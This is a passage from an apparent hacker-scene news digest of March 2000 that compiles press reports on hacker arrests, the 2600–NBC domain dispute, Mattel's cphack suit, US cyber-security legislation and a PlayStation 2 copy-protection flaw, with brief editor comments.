      numbers. Additional charges may be filed within the United States.
      (Some news outlets are reporting that Curador got a hold of Bill Gates
      Credit Card info. This was proven to be false several weeks ago. It
      looks like the UK Telegraph was the first to mention it, and of course
      several of the wire services picked it up without verifying the
      information. Don't believe everything you read.)

      The Inferno.br, one of the main underground groups in Brazil, was
      dismantled last Tuesday by the Sector of Crimes for the Internet of
      the Civil Policy of Sao Paulo. One of the leaders of the group, known
      as Jamiez Jamiez or JZ, was apprehended at his residence and had his
      computer and all related material confiscated. The Inferno had been
      active since September of 1998 and has taken credit for the defacement
      of several web pages. Agents involved with the case claim that
      Microsoft helped them in gaining access to the groups Hotmail account.
      Investigators expect more arrests of group members in the next few
      days. (Note: Information for this article was gathered from a

       British Intelligence Laptop Stolen at Station
       March 24, 2000 10:51 am EST

       LONDON (Reuters) - British police said Friday they were hunting a thief 
       who had stolen a secret service computer containing confidential 
       information on        Northern Ireland. 

       The laptop computer was snatched while an employee of Britain's domestic 
       security service, MI5, was buying a ticket at London's Paddington train        
       station. 

       "I can confirm that a laptop computer was stolen from the security 
       service employee on March 4 at Paddington Underground (station)," said a        
       government official who declined to be identified. 

       "The information contained in the laptop was well protected and we 
       believe it to be secure. We are not prepared to discuss the nature of the 
       material."

       The information on the computer was understood to be heavily encrypted 
       and was related to the situation in Northern Ireland, but not to refer to 
       the        state of the peace process or any guerrilla threat. 

       A spokesman for Prime Minister Tony Blair said officials were always 
       concerned at the loss of any sensitive material, but they were confident 
       it was        secure and that national security had not been threatened. 

       "We believe this is an opportunistic theft and not a deliberate attempt 
       to gain access to security service information," he said. 

       Asked why agents were walking around with security information on 
       computers, the spokesman said there were strict procedures for moving 
       classified        material. "You can certainly say they've been tightened 
       since this incident," he added. 

       The Sun newspaper said a squad of 150 police were working around the 
       clock to catch the thief. Before the start of the 1991 Gulf War in Kuwait 
       and        Iraq, a laptop said to have contained war plans was stolen 
       from the car of a Royal Air Force officer, who lost his job as a result. 

       The latest theft comes as the peace process in Northern Ireland is in 
       disarray. 

       Last month Britain decided to suspend a fledgling home-rule government
       over lack of progress on disarmament by Irish Republican Army guerrillas. 
       
       (For those of you not living in the United Kingdom or Ireland, this is
       a VERY BAD SCENE to have happen, Brits live in fear of the threat of 
       terrorist bomb attacks on a daily basis and any intelligence to help
       the murdererous IRA and rogue factions could be devestating to any
       hope of peace in the UK and Northern Ireland ... - Ed)

      Canada Called Hotbed of Cyberterrorism By Martin Stone, Newsbytes Special 
      to the E-Commerce Times March 27, 2000 

                      An American intelligence agency has determined that up to 
                      80 percent of foreign attacks on U.S. computers either 
                      originate or pass through Canada. The claim                       
                      follows suspicions that some recent hacker attacks were 
                      routed through Canadian computers. 

                      A weekend article by the Ottawa Citizen newspaper said a 
                      report prepared last year for Canada's Department of 
                      National Defence quotes the U.S. Defence                       
                      Intelligence Agency, the military counterpart to the CIA, 
                      as warning that Canada is seen as a "Zone of 
                      Vulnerability." 

      The U.S. Defence Intelligence Agency estimates that a full 80 percent of 
      the attacks upon U.S. systems originate in or pass through Canada, the 
      report stated. The Citizen noted       that the report, prepared by 
      Canadian military and intelligence agencies, including the ultra-secret 
      Communications Security establishment, further said, "It is the assessment 
      of the (Canadian government's) Intelligence Policy Group that the United 
      States and our allies will expect Canada to participate in combating and 
      reducing the cyber threat." 

      Hacker Haven 

      FBI Director Louis Freeh recently called Canada a "hacker haven." FBI 
      investigators believe one or more Canadian Internet servers were used in 
      the attacks that recently disabled       Yahoo!, eBay and other U.S.-based 
      commercial sites. 

      Colonel Randy Alward, commander of the Canadian Forces Information 
      Operations Group, is quoted by the newspaper as saying the high number of 
      hacker attacks coming from       Canada is due to a high degree of 
      computerization. The colonel is reported as saying that Canada is a very 
      wired country and that hackers will typically bounce through different 
      computer systems to hide their original location. 

      Welsh Teens Stage Attacks 

      The newspaper noted that Canadians, too, can also be the victims of 
      cybercrimes and cited reports of two teenagers in Wales who were recently 
      arrested following an international       investigation by the FBI and the 
      Royal Canadian Mounted Police. 

      The 18-year-olds allegedly used the alias "Curador" to hack into nine 
      e-commerce sites, at least one of which was Canadian, from which they are 
      believed to have stolen more than       26,000 credit card numbers and 
      other personal information, and posted some of it to other hackers. 

      The Citizen said the cost of canceling the cards and issuing new ones will 
      exceed $3 million (US$), and there may be additional losses if the 
      information was used by others to make       purchases. 

      However, Sam Porteous, director of intelligence for Kroll Associates 
      Canada, a corporate security firm, warned against taking the intelligence 
      estimates too seriously, saying the       military often uses broad 
      definitions of what constitutes a cyberattack. He conceded, though that 
      Americans have valid concerns about Canada, seeing the country as a 
      conduit they don't have control over, and that unnerves them, he told the 
      newspaper. 

      The Citizen cites other cyberwarfare specialists who acknowledge that, 
      while that Canada has a large population of computer literate citizens, 
      question whether the number of       Canadian-launched attacks are as high 
      as the intelligence report suggests. Thomas Welch of JAWS Technologies, a 
      computer security firm with U.S. and Canadian offices, said he believes 
      the report overstates Canada's role in cyberterrorism and that, while a 
      good percentage does go through or come from Canada, a large percentage of 
      attacks on Canadian sites go via the United States.

      It's clear to us that the people at NBC have become separated from some 
      key bits of logic so we will try and help them out. 

      Free speech is at the heart of the net. While companies and other entities 
      are entitled to protect their trademarks, it is entirely acceptable for 
      sites like www.aolsucks.com, www.fuckfrance.com, and even 
      www.fuckgeorgewbush.com to exist without fear of harassment. We invite NBC 
      (or anyone else, but let's give them first crack at it) to register 
      fuck2600.com or 2600sucks.com. And if we feel like registering 
      www.nbcsucksbecausetheyhavelawyerswithtoomuch- timeontheirhands.com, no 
      legal threat is going to convince us not to fight for this very 
      fundamental freedom. 

      We think NBC may have been confused because we were pointing 
      www.fucknbc.com to www.nbc.com. Perhaps they thought we had STOLEN their 
      web site. We've seen bigger leaps in corporate logic so this conclusion is 
      entirely possible. Let us be clear - we were merely POINTING one site to 
      another, something that is perfectly acceptable in the world of the

      NBC attacks critical domain name

      2600.org no longer points to the Peacock's
      site, but hacker newsletter says it's another
      case of cyber bullying and an attack on free
      Web speech.

      By Lisa M. Bowman, ZDNet News
      March 27, 2000 2:45 PM PT 


      The hacker newsletter 2600.org has stopped
      pointing the domain name f--knbc.com to the official
      NBC Web site after the media company threatened
      to sue.
      
      NBC alleges that the 2600 site violated both its trademark and copyright 
      interests. 2600 has owned the domain name since late last year.

      In an e-mail message to Emmanuel Goldstein, who runs the 2600 site, NBC 
      goes further than just requesting that 2600 stop pointing to NBC. It also 
      claims that the use of NBC's name in this way violates the law, an 
      assertion that raises free-speech issues.

      "If the site is not taken down immediately, and arrangements made to cease 
      and discontinue all use of this name, we will pursue all necessary legal 
      remedies including instituting litigation in the appropriate venture," the 
      message from NBC attorney Gillian Lusins reads.

      NBC officials could not immediately be reached for comment.

      Can ICANN intervene? Goldstein said he hasn't received a physical letter, 
      and that this is just one of many such battles his group is fighting.

      "We're seeing a disturbing increase in corporate intimidation," said 
      Goldstein, who added that 2600.org only changed the URL's destination to 
      call out attention to NBC's ploy. "People need to not buckle to these 
      scare tactics." 

      The letter comes as board members of ICANN -- the nonprofit private 
      corporation charged with doling out domain names -- are deciding whether 
      to add more top-level domains to the current selection that includes .com, 
      .org and others. 

      Some nonprofit stakeholders, such as Ralph Nader's Consumer Project on 
      Technology, have proposed adding words such as ".sucks" and ".isnotfair," 
      so that people critical of a particular company or organization would have 
      a place to express their opinion.

      However, during a recent board meeting in Cairo, Egypt, ICANN directors 
      didn't seem too receptive of such a plan, pointing out that critics of a 
      company already register domains containing those words, as in 
      "nbcisnotfair."

      Companies fighting back However, NBC's stance shows that companies are 
      inclined to fight the use of such domain names, even if their efforts 
      thwart free speech.

      NBC joins a growing list of corporations going after not only 
      cybersquatters who violate their trademarks, but also sites that contain 
      content or domains they don't like. 

      But they haven't been too successful in the most public cases.

      In January, toy seller eToys Inc. (Nasdaq: ETYS) settled with Swiss art 
      group Etoy, which it had accused of trademark infringement, even though 
      the group had owned the domain before eToys existed.

      Also, Bally Total Fitness lost an attempt to go after the owners of a 
      domain critical of the company that contained the Bally name. 

      More 2600.org targets Meanwhile, 2600.org is still making mischief, saying 
      it has received many proposals to provide content for the f--knbc site and 
      will pick the best one. Right now, the site points to the NBC letter and 
      2600's side of the story.

      "Etoy won their battle, and we believe others will follow if we stick 
      together and refuse to cave in," Goldstein said. Goldstein and his cohorts 
      also have registered the F--kingmorons.com domain name, which leads to the 
      Motion Picture Association of America -- a trade group that has sued 2600 
      and others, claiming their plans to crack the code that encrypts DVDs 
      violates laws
      protecting trade secrets and copyrights.

      Mitnick Movie Opens in France

      "Takedown" movie finally premieres... dubbed in French. By Kevin Poulsen 
      March 27, 2000 1:14 PM PST

      It may never make it to theatres in the English speaking world, but a 
      controversial motion picture based on the digital manhunt that snared 
      hacker Kevin Mitnick debuted in France this month, to generally poor       
      reviews and unspectacular box office receipts.

      The movie, from Miramax's genre label Dimension Films, is based on the 
      book "Takedown: The Pursuit and Capture of America's Most Wanted Computer 
      Outlaw -- By The Man Who Did It," authored by computer       security 
      expert Tsutomu Shimomura and New York Times reporter John Markoff. 

      Shimomura electronically tracked Mitnick to his Raleigh, North Carolina 
      hideout in February, 1995, and sold the book and movie rights for an 
      undisclosed sum amidst the storm of publicity following the fugitive       
      hacker's arrest

      Early versions of the screenplay for the movie adaptation of "Takedown" 
      cast Mitnick -- played by Scream star Skeet Ulrich -- as violent and 
      potentially homicidal. In July, 1998, supporters of the then-imprisoned       
      cyberpunk rallied against the film outside Miramax's New York City 
      offices. Writers later revised the script, and shooting wrapped on the 
      project in December, 1998. 

      Since then the film has languished without a US release date, amid rumors 
      of a direct-to-video or cable TV release. 

      The French-dubbed version of the 90 minute film is titled Cybertraque. It 
      opened on March 15th. A promotional web site features streaming video of 
      the theatrical trailer.

      Miramax publicists didn't return phone calls about the movie. The exact 
      box office take of Cybertraque is unknown, but receipts failed to crack 
      France's top-ten list on the movie's opening weekend. 

      French critics have generally panned the film. A review in the French 
      newspaper Le Monde notes the film's problems in translating a virtual 
      manhunt to the action-adventure genre. "Can       the repeated image of 
      faces sweating over keyboards renew the principles of the Hollywood 
      thriller?," the paper asks. "It's easy to say that the filmmaker hardly 
      reaches that point, regardless of his saturation of the soundtrack with 
      rock music to defeat the boredom of the viewer." (translated)

      Mitnick cracked computers at cell phone companies, universities and ISPs. 
      He pleaded guilty in March, 1999, to seven felonies, and was released from 
      prison on January 21st, 2000, after nearly five years in       custody. 

      Last month he testified before a Congressional committee on governmental 
      computer security.

      Mattel Stays on the Offensive by Declan McCullagh 

      2:45 p.m. Mar. 27, 2000 PST       BOSTON -- Upping the stakes in a battle 
      over a utility that reveals Cyberpatrol's list of off-limits websites, 
      Mattel threatened mirror sites with contempt charges during a court 
      hearing Monday afternoon. 

      Mattel, which sells Cyberpatrol, said the toy giant had acquired the 
      copyright to "cphack" from the two cryptoanalysts who published it on 
      their website earlier this month in a settlement agreement signed on March 
      24. 

      Citing a March 16 Slashdot thread that said "it's time to mirror!", Mattel 
      attorney Irwin Schwartz advised against anyone thinking of distributing 
      cphack from now on. 

      
      "They should be afraid of being hauled into court on contempt 
      proceedings," Schwartz told the judge. 

      Just 25 minutes before the hearing was scheduled to begin, Mattel filed 
      documents with the court saying it was ready to abandon its lawsuit over 
      cphack, which allows owners of Cyberpatrol to view the program's secret 
      encrypted       blacklist. 

      As part of the agreement, Mattel said it wanted a permanent court order 
      that applied to mirror sites, too. 

      The American Civil Liberties Union, which is representing three mirror 
      sites, said it did not object to the lawsuit's dismissal -- but it wanted 
      to make sure its clients would not be at risk. 

      ACLU attorney Chris Hansen asked U.S. District Judge Edward Harrington to 
      exempt mirror sites from his order, saying Mattel could simply file 
      another suit if it suspected violations of its new copyright. 

      "My clients do not want to be put to the test of contempt," Hansen said. 

      Contempt citations could include fines or jail time. 

      At the end of the hearing, which lasted one hour, Harrington said he would 
      consider Hansen's request and decide by Wednesday. Harrington said he 
      would continue his earlier temporary restraining order until then. 

      But he indicated he was a little worried about an order that would apply 
      to people who aren't defendants, saying "they have not been heard." 

      The seven-page "assignment agreement" signed by cphack co-author Eddy 
      Jansson of Sweden gives Mattel "all rights" to the program's source code 
      and binaries and an explanatory essay he wrote. Co-author Matthew Skala of 
      Canada       signed a similar agreement giving up his rights for one 
      dollar.

     DAILY BRIEFING

     Senate panel approves cyber-security mandates

     By Spencer Rich, National Journal News Service

     The Senate Governmental Affairs Committee on Thursday approved legislation 
     (S. 1993) to provide "a comprehensive framework" for protecting federal 
     computer records against cyber-attacks by outside hackers.

     The bill also seeks to guard against unauthorized disclosures caused by 
     accidental or careless procedures in handling and protecting information.

     Co-sponsored by Committee Chairman Fred Thompson, R-Tenn., and Ranking 
     Democrat Joseph Lieberman of Connecticut, the bill passed by voice vote. 
     The Clinton Administration had worked with the committee to iron out some 
     issues in the original version of the bill, according to committee aides.

     When the bill was first introduced last Nov. 19, Thompson complained that 
     "federal agencies continue to use a band-aid approach to computer security 
     rather than addressing the systemic problems which make government systems 
     vulnerable to repeated computer attacks."

     "Hopefully, the recent breaches of security at the various 'dot.com' 
     companies is the wake-up call needed to focus attention on the security of 
     government computer systems," Thompson said.

     At that time, Lieberman also observed, "Government computers are rife with 
     sensitive information ... on national security, the strength of our 
     economy, transportation and communications systems and the personal lives 
     of millions of citizens"as well as the mechanisms for controlling weapons 
     of mass destruction, tracking the offensive movements of enemy states and 
     controlling the economy and threats to public health. All these appeared 
     vulnerable to computer hijacking, he said.

     Yet, Lieberman said, the General Accounting Office had found that a test 
     unit it set up could crack computerized information systems controlling 
     spacecraft and information gleaned by space exploration, obtain access to 
     State Department networks, veterans' records, tax records and benefit and 
     demographic information. In some cases, the test unit found it would have 
     been able to alter the information in these systems if it wanted to do 
     mischief, he said.

     Thompson said the weaknesses of the computer information system were 
     essentially a management issue.

     To correct this, the bill approved Thursday would set up a tight chain of 
     command and responsibility for strengthening and protecting computer 
     records. It would stretch from the director of the Office and Management 
     and Budget at the top to individual departments and agencies below. Each 
     one's progress in developing plans to strengthen computer security and 
     protecting information would be monitored peridiodically by an outside 
     agency, such as the GAO.

     Each government agency would have to develop a security plan, switch to 
     procedures identified as "best practices,"and make sure the relevant 
     employees are properly informed and trained, under the bill.

     At the head of this chain of command would be the OMB director. Under him, 
     Thompson explained at Thursday's committee meeting, the deputy OMB director 
     for management "will be responsible for seeing that agencies do what they 
     should in non-defense areas," and the Secretary of Defense and the Director 
     of Central Intelligence would have similar responsibility with regard to 
     national security, defense and other "classified information systems." 

     "They must adopt progams and plans that will make us secure," Thompson 
     added.

     Thompson said the GAO would monitor the various computer security programs 
     at departments and agencies annually. "This will make it as secure as 
     possible," said Lieberman: "an annual plan and independent audit" of each 
     agency.

     According to the committee, the bill, as approved, would:

          Establish clear federal agency accountability for information 
          security. Require each agency to have an annual independent 
          evaluation. Give the Defense Secretary and CIA director responsibility 
          for national security and other classified information system 
          security. (Addition of this provision was one of the major changes 
          made in the original bill by the substitute text, staff aides said.) 
          Give agency managers flexibility to attract the "best and brightest 
          technology talent through the use of scholarships, fellowships and 
          federal service agreements." (This was another major change made by 
          the substitute text, the aides said.) Focus on the importance of 
          training programs. 

     An amendment by Sen. Daniel Akaka, D-Hawaii, added by voice vote, would 
     require agencies to report on the time periods and resources needed to 
     implement agencywide
     security programs.

      Census tests security 

      BY Judi Hasson       03/27/2000 

      The Census Bureau has hired a company to try to break into       its 
      Internet site and brought in the super-secret National Security Agency to 
      test Census security systems. 

      Census officials said they are certain the data is safe but       want to 
      make sure there are no vulnerable spots. 

      "Every day, people are scanning our ports. Its not just our       site. 
      Its any site, said J. Gary Doyle, who is responsible for systems 
      integration at the Census Bureau. 

      Among the steps that the Census Bureau has taken to       protect the 
      decennial count: 

           * Hiring the technology firm Science Applications            
           International Corp. to try to break into the Census Internet site, 
           where respondents can file online. SAIC began working last week, and 
           there have been no reports of successful entry into the site. 

           * Enlisting NSA to make sure the site is secure. 

           * Erecting firewalls to prevent penetration. Among the precautions: 
           prohibiting            e-mail from entering the site unless there is 
           a specific address on it and barring outside computers from dialing 
           up the census computer in the building. 

           * Encrypting all census data from the time it leaves a data scanning 
           center            via a secure telephone line until it arrives at the 
           Census computer center in Bowie, Md. 

           * Making three copies of the data and storing it in different vaults. 

           * Providing backup systems at the Bowie computer center, including            
           generators and air conditioners. 

      The Census Bureaus precautions have gotten high marks from security 
      experts       inside and outside government 

      "Census is using all of the proper security practices," said Richard 
      Smith, vice       president of federal operations at Internet Security 
      Systems Inc. "I would guess the
      likelihood of someone getting in is small."

                 damages, according to court documents. 
                      The group, which went by the names total-Ka0s and
                 Global Hell, became a national concern after officials
                 said it hacked the White House site on May 9. The
                 breach prompted the Secret Service temporarily to shut
                 down White House access to the Internet while it
                 scrambled to block the security flaw.
                      The hackers replaced the governments site with the
                 words, Why did we hack this domain? Simple, we
                 f***ing could. 
                      What makes this so scary from a government
                 standpoint is youve got a bunch of kids between 16 and
                 27 and all of a sudden they start getting on conference
                 calls coordinating their attacks on company after
                 company, just like them going down and vandalizing 14
                 houses on a block in a row, said Matt Yarbrough, who
                 was the lead federal prosecutor on the case and is now an
                 e-commerce attorney for Vinson & Elkins of Dallas. 

                 MostHateD
                 Gregory, 19, has agreed to plead guilty to one count of
                 conspiracy to commit telecommunications fraud and
                 computer hacking, according to documents filed in the
                 U.S. District Court of Northern District of Texas. 
                      Gregory, who used the online moniker MostHateD,
                 has signed a plea agreement admitting he and other Global
                 Hell members used the Internet to hack into 115
                 computer systems around the world between January
                 1997 and May 1999, the court documents say.
                      He was expected to plead guilty in federal court in
                 Dallas today but the hearing has been postponed,
                 Assistant U.S. Attorney Reid Wittliff said. The plea
                 hearing will likely be rescheduled for sometime in the next
                 few weeks. 
                      He could receive up to five years in prison and
                 $250,000 in fines. He could also be ordered to pay up to
                 $2.5 million in restitution.
                      These people would have never come together in one
                 place and been so coordinated if Patrick hadnt been the
                 driving force behind that, Yarbrough said. Essentially,
                 Patrick was the ringleader, the front man and media mind
                 of Global Hell, and the scary force that scared the heck
                 out of companies. 
                      In an exclusive interview with Brian Ross of ABCs
                 20/20 in December, Gregory said the White House and
                 other victims should be thankful for Global Hell because
                 the hackers used their computer genius to spot security
                 loopholes in the computer system they target. 
                      If you can get into the high security like that, youre
                 going to be proud, Gregory said. You had the
                 knowledge to do something nobody else in the world
                 could do. 

                 Hackers Plotted on Net
                 Gregory admitted, in the plea agreement, to stealing
                 telephone conferencing services from AT&T, MCI, Sprint
                 and Latitude Communications worth tens of thousands of
                 dollars. 
                     He and other members of Global Hell illegally acquired
                 telephone numbers, personal identification numbers and
                 credit card numbers and used them to hold hours of
                 conference calls, during which they would discuss
                 hacking, according to court documents. 
                      The group also discussed their hacking plans on
                 Internet chat rooms, specifically on one called #creep,
                 the documents said. 
                      Once they gained unauthorized access to the computer
                 systems, Gregory and the groups other members placed
                 various codes, files, programs and services on them, the
                 court papers said. 

                 Global Hell Will Not Die
                 Typically, the hackers defaced the Web pages of the
                 victims sites, replacing them with text and graphics
                 relating to Global Hell. The U.S. Armys page, for
                 example, was replaced with the message, Global Hell is
                 alive. Global Hell will not die. 
                      The hackers also intentionally deleted data and
                 crashed some of the computer systems, causing hundreds
                 of thousands of dollars in damages in some cases. 
                      These damages were sometimes financial and
                 sometimes intangible, including the loss of faith in the
                 organizations and brand name due to the public
                 defacements of their Web sites, the plea agreement says. 
                      Authorities say Gregory personally participated in the
                 hacking of at least three Web sites: 1688.com, the
                 American Retirement Corp.s site, and Blue Byte
                 Softwares site. After hacking into 1688.com, a design
                 firm, on April 27, 1999, he stole banking information and
                 e-mail passwords and posted them on the Internet, court
                 documents say. 

                 Cohorts Convicted
                 Two other Global Hell members have already been
                 convicted. 
                      The Global Hell member who hacked into the White
                 House, 19-year-old Eric Burns of Shoreline, Wash.,
                 pleaded guilty in federal court last November and was
                 sentenced to 15 months in prison and ordered by the
                 judge not to touch a computer for three years after that. 
                      Earlier this month, Chad Davis, 20, of Ashwaubenon,
                 Wis., was sentenced to six months in prison for accessing
                 and altering the Armys Web site. 
                      The judge also ordered that Davis pay $8,054 in
                 restitution to the Army for the cost of restoring the Web
                 site; serve three years of supervised release after the
                 six-month prison term; not have contact with anyone from
                 Global Hell; and gain approval from future employers to
                 use the Internet. 
                      If its used wisely, it will carry you over the rainbow,
                 U.S. District Judge J.P. Stadtmueller said of the Internet.
                 But you got yourself involved with something that took
                 you down a very different path, causing a problem for one
                 branch of government. This is a deadly serious business.

   FBI cracks down on increasing cybercrimes By Reuters Special to CNET News.com 
   March 28, 2000, 12:40 p.m. PT 

      WASHINGTON--The number of cybercrimes being investigated by the FBI has 
      doubled in the past year, and last month's attacks on leading Web sites 
      are the tip of the iceberg, FBI director Louis       Freeh said today. 

      Addressing a Senate subcommittee of cybercrime, Freeh suggested changes to 
      the law that would help track down cybercriminals and make it easier to 
      keep pace with the fastest-growing area of crime in the United States. 

                          In 1998, Freeh said the FBI opened 547 "computer 
                          intrusion" cases, and this more than doubled to 1,154 
                          last year. In 1998, the FBI closed 399 of those cases 
                          and 912 last year. 

                          "In short, even though we have markedly improved our 
                          capabilities to fight cyberintrusions, the problem is 
                          growing even faster," he told the committee. 

                          Cyberthreats included disgruntled employees, hackers 
                          who "cracked" into networks for the thrill of it or 
                          for financial gain, and virus writers. 

      Criminal groups and terrorist organizations also used technology more to 
      raise funds, spread propaganda and communicate with each other. 

      Freeh declined to give details of the attacks last month on business Web 
      sites such as Yahoo, eBay and Amazon.com, as these are under 
      investigation. But he said the attacks were "the tip of the iceberg" and 
      demonstrated the ease       with which such crimes could be committed. 

      Freeh said U.S. laws have not kept pace with fast-changing technology, 
      adding that the FBI is working with the Justice Department to propose a 
      legislative package to update laws. 

      Responding to his comments, Democratic Sen. Charles Schumer from New York 
      said laws are set up at a "sub-sonic" speed at a time when the process 
      should be faster than the speed of light. 

      Freeh said he does not want "extraordinary powers," just enough to deal 
      with the phenomenal changes that have accompanied the Internet. 

      One problem is that to track down a cybercriminal, court orders often have 
      to be issued in several states. "There is a needless waste of time and 
      resources, and a number of important investigations are either hampered or 
      derailed       entirely in those instances," Freeh said. 

      The use of administrative subpoenas would enable investigators to work 
      more efficiently, he said. 

      Senators on the committee said some companies are reluctant to report 
      cybercrimes for fear of harming their stock prices. 

      The president of the Information Technology Association of America, Harris 
      Miller, told the committee that few high-tech firms are interested in 
      being seen by customers as active law enforcement agents. 

      "No company wants information to surface that they have given in 
      confidence that may jeopardize their market position, strategies, customer 
      base or capital investments," he said. 

      Asked about the cooperation of foreign governments, Freeh cited the United 
      States' close relationship with Canada. A couple of weeks ago, Freeh said 
      an FBI office in New Haven picked up an online statement from a youth who 
      said       he felt like "shooting up a school." 

      A 14-year-old in a small Canadian town was tracked down and found to have 
      access to explosives and other weaponry. 

      Over the New Year's period, Freeh said he had close contact with Far East 
      and Middle Eastern countries and that FBI agents there had been given 
      access to computers and hard drives to investigate threats against 
      Americans. 

      Freeh said that he visited six areas in the Gulf recently, and all 
      mentioned cybercrime. "The Internet has no boundaries or sovereignty," he 
      said.

      Watch out! There's a Cyberterrorist about

      London police are warning banks to look out for cyber terrorists when 
      recruiting staff. 

      Anarchist sympathisers may try to infiltrate companies and sabotage 
      computer       systems to help the anti-City protests expected in May, a 
      senior crime prevention officer said yesterday. 

      Norman Russell, head of the City of London police community safety branch, 
      said       firms should grill new staff for any cyber-spy tendencies. 

      Job applicants who support the aims of anarchist umbrella group People's 
      Global       Action might help demonstrators enter company buildings 
      during the forthcoming Stop the City protests. Alternatively, they could 
      insert viruses in computer files or leak passwords to let hackers 
      penetrate computer systems, the Mail on Sunday reports. 

      And Russell's advice to spot these saboteurs? 

      "Employers should make sure that they take up references of new 
      employees." 

      Sound advice. The Register has gone further, and compiled a few suspicious 
      comments to       help employers when they are interviewing City slicker 
      applicants. 

      Anyone letting slip comments like "Bring the Capitalist dogs to their 
      knees!" Or "Cream the City       fat cats!" should definitely be treated 
      with caution. 

      As should utterances along the lines of: "The roar of profit and plunder 
      will be replaced by the       sounds of rhythms of party and pleasure as a 
      massive carnival of resistance snakes its way through the square mile." 
      (genuine quote - Reclaim the Streets). 

      But in case these cyber-saboteurs have become more CV-savvy, it may be as 
      well to develop       your own techniques to pinpoint a likely candidate. 
      The Register welcomes any tips on how to spot a likely lord or lady of 
      misrule. 

      Meanwhile, a new nation has emerged to take the cyberwarfare crown. 
      According to Newsbytes,       Canada is now a hotbed of cyberterrorism, 
      responsible for 80 per cent of foreign attacks on US computers. 

      FBI director Louis Freeh went so far as to describe this normally 
      law-abiding Mounty nation as a       "hacker haven".

      Mattel Suit Takes GNU Twist by Declan McCullagh 

      3:00 a.m. Mar. 28, 2000 PST       BOSTON -- Mattel's claim of victory 
      Monday in a lawsuit over its Cyberpatrol filtering software may be 
      premature. 

      The toy giant said during a court hearing here that it had acquired 
      intellectual property rights to a program that reveals Cyberpatrol's 
      secret list of off-limits websites and settled the case. Mattel said it 
      planned to use its new       copyright in court to ban Internet copying of 
      the "cphack" utility. 

      
      But cphack's authors released it under the GNU General Public License, 
      which appears to permit unlimited distribution of the original cphack 
      program, even if Mattel now owns the copyright. 

      "Once you do that you can't revoke it," said Bennett Haselton of 
      Peacefire, a group opposed to filtering software that temporarily put up 
      its own cphack mirror site. 

      The Free Software Foundation's GPL agreement says that "the recipient 
      automatically receives a license from the original licensor to copy, 
      distribute or modify the program." 

      Translation: A copyright holder can't change his mind. 

      "GPL is software that cannot be revoked," said Eben Moglen, a law 
      professor at Columbia University and FSF general counsel. "Anyone 
      downstream who possesses a copy of the software may redistribute it. 

      "It's a very amusing case," Moglen said. "If people are going to respond 
      to free software they don't like by trying to wipe it out, they're in for 
      some real trouble." 

      A spokeswoman for Mattel reached late Monday said she didn't know what the 
      effect of the GPL would be. 

      But she said cphack authors Eddy Jansson and Matthew Skala had signed a 
      contract with Mattel and if there was any deception, "they'd be in big 
      trouble." 

      The agreement with Jansson gives "all rights, if any" to the cphack source 
      and object code and accompanying essay to Mattel. 

      The agreement also states that Jansson and Skala attest they "are the sole 
      proprietors of all rights" involved with cphack and have "not assigned" 
      them to anyone else. 

      Even if Mattel cannot claim exclusive copyright in cphack, it may be able 
      to pursue lawsuits on other grounds.

                  Video enthusiasts in Japan have found a
                  second backdoor in Sony Computer
                  Entertainment's newly launched Playstation
                  2. 

                  This time, fans have discovered a way to exploit the
                  game console's analog RGB output to illegally copy
                  DVD content to a videotape, circumventing the
                  system's copy-protection technology. The technique is
                  being discussed on Japanese websites. 

                  The discovery of such a flaw is another blow to Sony,
                  already embarrassed earlier this month when users in
                  Japan found a way into Playstation 2 to subvert a
                  geographical code for DVD video disks. 

                  So far, the issue has not raised the ire of movie studios
                  or others in the consumer electronics industry.
                  However, it could accelerate a movement that's quietly
                  forming behind the scenes to develop a new copy
                  protection scheme for the legacy analog RGB interface
                  used both in Playstation 2 and on PCs. 

                  At issue is whether Sony Computer Entertainment has
                  violated a DVD industry agreement that prohibits DVD
                  players from having an analog RGB interface. If so, it's
                  possible that Hollywood studios could take some action
                  against Sony. 

                  But some in the industry pointed out this week that
                  Sony could make the case that Playstation 2 is not a
                  stand-alone DVD player, but a PC. Under the DVD
                  specs, PCs are permitted an RGB output. So far,
                  however, Sony has not resorted to this argument. 

                  Sony Computer Entertainment acknowledged on
                  Wednesday that problems with copy protection can
                  arise from the use of an analog RGB interface, but said
                  the company did nothing wrong and that the RGB
                  interface on the Playstation 2 complies with the DVD
                  specs. 

                  A company spokesman said Sony installed in
                  Playstation 2 appropriate means of preventing any
                  illegal analog-to-analog copying, by providing security
                  coding from Macrovision for all the system's output
                  interface signals: RGB, composite, component, and
                  S-video. For copy protection of analog RGB signals,
                  Sony worked with Macrovision to add Macrovision
                  code in RGB's synchronous signals, the Sony
                  spokesman said. 

                  Further, the game console comes with a cable that
                  outputs widely used composite video signals. An
                  optional cable outputs S-video signals and component
                  signals. In either case, these video signals are protected
                  by Macrovision technology, and taped images are
                  therefore of a substantially lower quality than the
                  originals. That means that nonhackers cannot readily
                  duplicate DVD video content, the spokesman said. 

                  However, anonymous sources have posted on various
                  websites the circuitry diagram and the model name of a
                  converter designed to turn analog RGB signals into
                  NTSC video signals. This converter is also capable of
                  inadvertently removing Macrovision code. 

                  Engineering executives at leading DVD hardware
                  manufacturers, who spoke on the condition of
                  anonymity, expressed frustration with the situation. They
                  said the DVD Copy Control Association (DVD CCA),
                  a licensing agency based in Morgan Hill, Calif., has
                  prohibited outfitting any DVD player with an analog
                  RGB output. The only exception is a Scart connector, a
                  21-pin connector used in Europe that includes RGB
                  output pins and comes with its own copy protection
                  measure. 

                  "DVD CCA is aware of the reports about this situation
                  and we are looking into it," a spokesman for the
                  association said. 

                  Meanwhile, Sony Computer Entertainment has not
                  given up its plan to deliver better picture quality for
                  displaying DVD images through an RGB output. The
                  company has proposed to the DVD Forum a new cable
                  specification featuring Sony's proprietary 12-pin
                  connector at both ends of the cable. This cable directly
                  conveys analog RGB signal from the Playstation 2
                  console to a TV set. Sony is currently the only company
                  selling TVs with a 12-pin input. 

                  So far, it is still unclear how the movie industry will
                  respond to the Playstation 2 issue. Studio executives
                  acknowledged this week that protecting against illegal
                  analog-to-analog copying via analog RGB output has
                  been a contentious dilemma for studios and the
                  computer industry. But most studios were hesitant to
                  complain about Playstation 2. 

                  When the DVD standard was first developed several
                  years ago, the consumer electronics, movie, and PC
                  industries all agreed to allow an analog RGB output for
                  PCs, but none for stand-alone DVD players. According
                  to sources working closely with the DVD Forum's
                  Copy Protection Technical Working Group, the three
                  industries reached that compromise because SVGA
                  was the only legacy link available to connect a PC
                  subsystem with an analog PC monitor. If studios ever
                  wanted to let consumers watch DVD movies on a
                  computer, this was the only pathway. 

                  Meanwhile, consumer electronics manufacturers agreed
                  to use composite, component, or S-video -- all
